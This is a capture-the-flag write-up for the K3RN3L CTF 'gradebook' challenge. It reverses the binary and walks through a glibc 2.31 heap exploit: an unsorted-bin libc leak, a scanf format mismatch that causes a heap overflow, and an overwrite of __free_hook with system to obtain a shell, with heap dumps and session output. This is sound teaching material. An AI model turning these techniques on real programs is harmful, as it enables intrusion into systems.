So for the past little while I didn't really have anything to write about, i haven't been  competing too much in CTF, but this weekend [K3RN3L CTF](https://ctftime.org/event/1438) came around. There was quite alot of fun challenges, one of which was gradebook.

# Intro

## Description

`My teachers been using a commandline gradebook made by a first year student, must be vulnerable somehow.`

Is that so? (you can find chall+exp files and libc+ld over [here](https://https://github.com/volticks/CTF-Writeups))
Were given a libc, so after we patch it in we can start:

`patchelf ./gradebook --replace-needed libc.so.6 ./libc.so.6`

## Reversing

Its apparent from the outset that this challenge seems to follow a similar formula to a heap note challenge.

```
~/Documents/k3rn3l21/gradebook❯❯❯ ./gradebook     
Student Gradebook
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 
```

Lets take a look into `main`:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Student Gradebook");
  while ( 1 )
  {
    puts("1. Add Student to Gradebook");
    puts("2. List Students in Gradebook");
    puts("3. Update Student grade");
    puts("4. Update Student name");
    puts("5. Clear Gradebook");
    puts("6. Exit Gradebook");
    printf("> ");
    __isoc99_scanf("%d", &choice);
    putchar(10);
    switch ( choice )
    {
      case 1:
        if ( total_students > 9 )
          puts("Class is full!");
        else
          add_student();
        break;
      case 2:
        list_students();
        break;
      case 3:
        update_grade();
        break;
      case 4:
        update_name();
        break;
      case 5:
        close_gradebook();
        total_students = 0;
        break;
      default:
        puts("Invalid Choice!");
        break;
    }
  }
}
```

Seems pretty basic, looks as if we can only call `add_student` 10 times tho. Lets take a look at that function first.

#### add_student

```c
__int64 add_student()
{
  struct_s *s; // [rsp+0h] [rbp-20h]
  void *buf; // [rsp+8h] [rbp-18h]
  char src[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  s = (struct_s *)malloc(0x18uLL);
  memset(s, 0, sizeof(struct_s));               // nulls out 24 bytes (aka, nobugs)
  puts("Enter student id: ");
  __isoc99_scanf("%8s", src);
  if ( (unsigned int)lookup(src) == -1 )        // try to find student ID in list of students
  {
    strncpy(s->ID, src, 8uLL);
    s->grade = -1;                              // grade - to be entered
    puts("Enter student name length: ");
    __isoc99_scanf("%d", &s->name_length);
    buf = malloc(s->name_length);               // alloc from provided student name length
    memset(buf, 0, 8uLL);                       // clear first 8 bytes to elimin8 leaks, what if there is another value?
    puts("Enter student name: ");
    read(0, buf, s->name_length);
    s->name = (char *)buf;
    STUDENTS[total_students++] = s;             // new student
    return 1LL;
  }
  else
  {
    puts("Student ID already taken!");
    return 0xFFFFFFFFLL;
  }
}
```

I defined a structure in the code to make it more readable; if you wanna do the same, simply go into IDA, right click and select `Create new struct type`, after that enter the following, or whatever structure you are defining:

```c
struct struct_s {
    char ID[8];
    int grade;
    int name_length;
    char *name;
}
```

Then set the corresponding variable to this new type.

First we allocate space for our new structure then null the first 24 bytes:

```c
  s = (struct_s *)malloc(0x18uLL);
  memset(s, 0, sizeof(struct_s));               // nulls out 24 bytes (aka, nobugs)
  puts("Enter student id: ");
  __isoc99_scanf("%8s", src);
```

After this, we enter an ID for a new student. Next we look to see if this ID already exists via the `lookup` function:

```c
__int64 __fastcall lookup(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < total_students; ++i )
  {
    if ( !strncmp(STUDENTS[i]->ID, a1, 8uLL) )
      return (unsigned int)i;
  }
  return 0xFFFFFFFFLL;
}
```

Simple enough, iterate through `STUDENTS`, which is a list of students to see if any of the ID's match, if they do then return the idx in students where the duplicate was found.

If we didnt find it, simply return `-1`. Coming back into `add_student`, we see that if no student with said ID was found, we create the student. 

Not something too important, but notice that even if the student ID is in use, we allocate space for a new student before the check, seems a bit wasteful but this was allegedly programmed by "a first year student" so no surprises there (this also seems like a real mistake I would make lol).  

```c
  if ( (unsigned int)lookup(src) == -1 )        // try to find student ID in list of students
  {
    strncpy(s->ID, src, 8uLL);
    s->grade = -1;                              // grade - to be entered
```

We copy the ID over into our newly allocated structure, also setting the grade for this student to `-1` which is a placeholder for when we insert tge grade later. 

After this its time to insert the name of the student:

```c
    puts("Enter student name length: ");
    __isoc99_scanf("%d", &s->name_length);
    buf = malloc(s->name_length);               // alloc from provided student name length
    memset(buf, 0, 8uLL);                       // clear first 8 bytes to elimin8 leaks, what if there is another value?
    puts("Enter student name: ");
    read(0, buf, s->name_length);
    s->name = (char *)buf;
```

First we enter the length, then allocate a chunk of that size to hold the name. We then null the first 8 bytes of the chunk, to avoid leaks. Next we enter student name and write it into the struct.

Finally we finish and return, but not before writing our new student into the array and incrementing `total_students`.

```c
    STUDENTS[total_students++] = s;             // new student
    return 1LL;
  }
```

#### list_students

```c
__int64 list_students()
{
  __int64 result; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)total_students;
    if ( i >= total_students )
      break;
    printf("NAME: %s\n", STUDENTS[i]->name);
    printf("STUDENT ID: %s\n", STUDENTS[i]->ID);// hmmm
    if ( STUDENTS[i]->grade == -1 )
      puts("GRADE: Not Entered Yet");
    else
      printf("GRADE: %d\n", (unsigned int)STUDENTS[i]->grade);
    puts("____________________________");
  }
  return result;
}
```
This is pretty easy to understand, simply go through the list of students and print out details such as a student's grades and name.

#### update_grade

```c
__int64 update_grade()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char v2[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Enter student id: ");
  __isoc99_scanf("%8s", v2);
  v1 = lookup(v2);
  if ( v1 == -1 )
  {
    puts("Student not found!");
    return 0xFFFFFFFFLL;
  }
  else
  {
    printf("Enter grade: ");
    __isoc99_scanf("%ld", &STUDENTS[v1]->grade);// you can still enter a huge grade, even if it tries to stop you afterwards.
    if ( STUDENTS[v1]->grade <= 100 && STUDENTS[v1]->grade >= 0 )// done well, even checks for negative
    {
      return 1LL;
    }
    else
    {
      puts("Grade must be between 0 and 100");
      STUDENTS[v1]->grade = -1;
      return 0xFFFFFFFFLL;
    }
  }
}
```
This simply attemps to find a student based on the ID, if student is found use the returned idx to edit the students grades, provided they are not above a certain threshold. If the grade does happen to be higher than 100, or less than 0 then we replace the grade with the `-1` placeholder again.

Take note of the format string used to enter the grade, also note that grade variable is only 4 bytes wide. This will be relevant later ;).

#### update_name

```c
ssize_t update_name()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char v2[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Enter student id: ");
  __isoc99_scanf("%8s", v2);
  v1 = lookup(v2);
  if ( v1 == -1 )
  {
    puts("Student not found!");
    return 0xFFFFFFFFLL;
  }
  else
  {
    puts("Enter student name: ");
    return read(0, STUDENTS[v1]->name, STUDENTS[v1]->name_length);
  }
}
```

Again, similar principle to the latter; look for an ID in `STUDENTS`, if you find it, change the name with the length value found in the struct.

#### close_gradebook

```c
__int64 close_gradebook()
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i < total_students; ++i )
  {
    free(STUDENTS[i]->name);                    // correct order for frees aswell :/
    STUDENTS[i]->name = 0LL;
    free(STUDENTS[i]);
    STUDENTS[i] = 0LL;
  }
  return 1LL;
}
```
All this does is free + null out every student + student name. After which we set `total_students` = 0 so even if students were not nulled, there would be no way to free them twice.

Now that we have a good idea what each function does, we can see how to exploit it.

# Exploitation

## Leaks

Before we go any further, note the protections on the binary:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

To put it bluntly, were gonna need at least a libc leak before we can go further, unless we find a primitive for a partial overwrite (spoilers: i didnt find any).

Let me draw your attention to `add_student` for a minute, specifically these lines, and their accompanying comment:

```c
    buf = malloc(s->name_length);               // alloc from provided student name length
    memset(buf, 0, 8uLL);                       // clear first 8 bytes to elimin8 leaks, what if there is another value?
```

Like the comment says, this is here to stop us from leaking an address left after the name chunk is re-used, however it doesnt take into account `bk`. Lets take a look at the [chunk structure](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1048) for glibc 2.31:

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
}
```
As you probably know, the chunk that the user of `malloc` recieves points to where `fd` would be in memory; by clearing the first 8 bytes of said memory we clear the `fd` pointer. But as the comment says these are double links, meaning both can be used.

A simple tcache or fastbin which is organized as a singly linked list only needs `fd`, which the `memset` call correctly clears, however chunks in the large and unsorted bin are a `double` linked list. I think you know where i'm going with this.

It gets better - chunks free'd into the unsorted-bin have their `bk` pointing back into libc where the bin-list starts:

```c
    if (nextchunk != av->top) {
        // [...]
          /*
    	Place the chunk in unsorted chunk list. Chunks are
    	not placed into regular bins until after they have
    	been given one chance to be used in malloc.
          */

          bck = unsorted_chunks(av); // gets location of unsorted bin list - the offset of 'fd' in malloc_chunk (16)
          fwd = bck->fd;
          if (__glibc_unlikely (fwd->bk != bck))
    	malloc_printerr ("free(): corrupted unsorted chunks");
          p->fd = fwd;
          p->bk = bck;
```
Theres only one issue: if we dont want our unsorted-bin chunk to immediately be consumed into the top chunk, as is its perogative, we need to fulfill the check which allows us to enter this branch of code in the first place (look at the top of the code snip).

So we need to:

 1. Allocate a student with a big name (at least unsorted-bin size)
 2. Allocate another student, not unsorted size so it wont consolidate with top when free'd
 3. Clear the gradebook, thus freeing both chunks.
 4. Allocate the student with the big name size again, fill in the first 8 bytes but no more.
 5. List students -> ptr to main_arena comes after the 8 bytes you filled.

In hidnsight I realize now that allocating the student chunk before the ID is validated can be used to create a barrier dummy chunk without having to make a whole new student -_-. 
In action this looks like:

```
Enter student id: 
0
Enter student name length: 
1500
Enter student name: 
AAAAAAA
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 2

NAME: AAAAAAA
�K��� <------------- leaks yay
STUDENT ID: 0
GRADE: Not Entered Yet
____________________________
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 

```

## Arbitrary write

Remember earlier when I commented about the `%ld` format string used in update grade?

Remember the layout of each student struct:

```c
struct struct_s {
    char ID[8];
    int grade; // we write an 8 byte number here
    int name_length;
    char *name;
}
```

Now, take into account that `%ld` allows you to enter numbers up to 8 bytes. You see it yet? We can use this mismatch to overwrite not only grade, but all of name_length after the allocation for name has already been created. Thus we can use this to make a heap overflow

Take a look at the chaos this can cause:

```
Student Gradebook
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 1

Enter student id: 
0
Enter student name length: 
20
Enter student name: 
asdf
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 3

Enter student id: 
0
Enter grade: 18446744073709551615 // == 0xffffffffffffffff
Grade must be between 0 and 100
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 4

Enter student id: 
0
Enter student name: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
1. Add Student to Gradebook
2. List Students in Gradebook
3. Update Student grade
4. Update Student name
5. Clear Gradebook
6. Exit Gradebook
> 

```
Lets have a look at the top chunk now:

```
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
    [0x00005555555592a0     30 00 00 00 00 00 00 00 ff ff ff ff ff ff ff 7f    0...............]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE)
    [0x00005555555592c0     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x5555555592e0, size=0x4141414141414140, flags=PREV_INUSE)  ←  top chunk

```
>:)

Now that we know how we have a heap overflow, how can we use this? Well another apect of the student struct is it stores the `name` pointer which can be written to via `update_name`. So if a student struct is stored AFTER our `name` buffer in memory we can completely overwrite all of its members, including the `name`. Since we also have a leak this is pretty much game over.

If you look at the heap immediately after our unsorted bin shenanigans, you can see that:

```
Chunk(addr=0x55a886bef010, size=0x290, flags=PREV_INUSE)
    [0x000055a886bef010     01 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55a886bef2a0, size=0x20, flags=PREV_INUSE)
    [0x000055a886bef2a0     00 00 00 00 00 00 00 00 10 f0 be 86 a8 55 00 00    .............U..]
Chunk(addr=0x55a886bef2c0, size=0x510, flags=PREV_INUSE) // name buffer
    [0x000055a886bef2c0     41 41 41 41 41 41 41 41 e0 0b 07 ba f9 7f 00 00    AAAAAAAA........]
Chunk(addr=0x55a886bef7d0, size=0x20, flags=PREV_INUSE) // student stucture for the above name
    [0x000055a886bef7d0     00 00 00 00 00 00 00 00 ff ff ff ff 00 05 00 00    ................]
Chunk(addr=0x55a886bef7f0, size=0x30, flags=PREV_INUSE)
    [0x000055a886bef7f0     00 00 00 00 00 00 00 00 10 f0 be 86 a8 55 00 00    .............U..]
Chunk(addr=0x55a886bef820, size=0x207f0, flags=PREV_INUSE)  ←  top chunk
```

Due to the way we get our leaks, the barrier chunk we allocate as a student is free'd, and is then consumed when we allocate another chunk for the leak AS THAT CHUNK's STUDENT STRUCTURE.

This means that we can overwrite all members of the struct, including the `name` ptr. One thing to be aware of is that you will also smash the `ID`, so you need to set it back to a number/string you know so you can find struct again to overwrite the name.

Another problem I had was I kept overwriting the name length with `0xffffffff`, because of this the `read` syscall in `update_name` was failing since the read length went outside the address space of the program - simply use a smaller value for this.

## What to write?

We have a libc leak, and libc in use is 2.31 which means the various debugging hooks in libc (`__free_hook`, etc...) are still in use. Imma assume you know about these, but if you dont.

```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0)) // if __free_hook != 0
    {
      (*hook)(mem, RETURN_ADDRESS (0)); // call whatever is there
      return;
    }
```

If we set the hook to any value other than 0, we get instant RCE. As a bonus the chunk passed to free is also the first argument, meanng if you control the data in the chunk, you may pass anything you want as the first argument.

All my exploit does is set the new name ptr as `&__free_hook`, and overwriting it with `system`. Prior to freeing the chunks to trigger `system`, you must have a chunk which will be freed which contains your command, so you can execute `system(your_cmd)`.

After overwriting name:

```
0x0000556f775ac7d0│+0x0000: 0x0000000000000000 // id
                              [length] [grade]
0x0000556f775ac7d8│+0x0008: 0x00000100ffffffff
0x0000556f775ac7e0│+0x0010: 0x00007f15844d1b28  →  0x0000000000000000 // name ptr (__free_hook)
```

And after the new name, `system` is written

```
0x0000556f775ac7d0│+0x0000: 0x0000000000000000
0x0000556f775ac7d8│+0x0008: 0x00000100ffffffff
0x0000556f775ac7e0│+0x0010: 0x00007f15844d1b28  →  0x00007f1584338410  →  <system+0> endbr64 
```

And finally, after we free:

```
$ ls -la
[DEBUG] Sent 0x7 bytes:
    b'ls -la\n'
[DEBUG] Received 0x177 bytes:
    b'total 2024\n'
    b'drwxr-xr-x  2 root root    4096 Nov 14 17:00 .\n'
    b'drwxr-xr-x 15 root root    4096 Nov 13 22:02 ..\n'
    b'-rw-r--r--  1 root root    2380 Nov 14 17:00 exp2.py\n'
    b'-rw-r--r--  1 root root    2367 Nov 12 20:35 exp.py\n'
    b'-rwxr-xr-x  1 root root   17608 Nov 11 21:34 gradebook\n'
    b'-rwxr-xr-x  1 root root 2029224 Nov 11 21:34 libc.so.6\n'
    b'-rw-r--r--  1 root root     283 Nov 12 22:34 notes.md\n'
total 2024
drwxr-xr-x  2 root root    4096 Nov 14 17:00 .
drwxr-xr-x 15 root root    4096 Nov 13 22:02 ..
-rw-r--r--  1 root root    2380 Nov 14 17:00 exp2.py
-rw-r--r--  1 root root    2367 Nov 12 20:35 exp.py
-rwxr-xr-x  1 root root   17608 Nov 11 21:34 gradebook
-rwxr-xr-x  1 root root 2029224 Nov 11 21:34 libc.so.6
-rw-r--r--  1 root root     283 Nov 12 22:34 notes.md
$  
```

# Conclusion

This was a nice challenge - i've never seen something as subtle as a format string mismatch in a ctf challenge before - it was only one character away from being correct.

Actually all of the challenges I tried were pretty fun - well except the math challenges, I dont wanna talk about that :|.

See you in 3 months time when I make another one of these, or it might be before. Idk.

Peace out.
